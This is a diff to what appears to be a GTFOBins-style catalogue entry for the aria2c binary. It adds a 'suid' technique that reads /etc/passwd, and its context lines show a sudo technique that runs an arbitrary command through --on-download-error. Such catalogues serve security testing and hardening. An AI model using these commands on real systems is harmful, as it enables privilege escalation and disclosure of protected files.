@@ -23,6 +23,11 @@ functions:
         echo "$COMMAND" > $TF
         chmod +x $TF
         sudo aria2c --on-download-error=$TF http://x
+  suid:
+   - description: It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+   - code: |
+        LFILE='/etc/passwd'
+        aria2c -i $LFILE
   limited-suid:
     - code: |
         COMMAND='id'
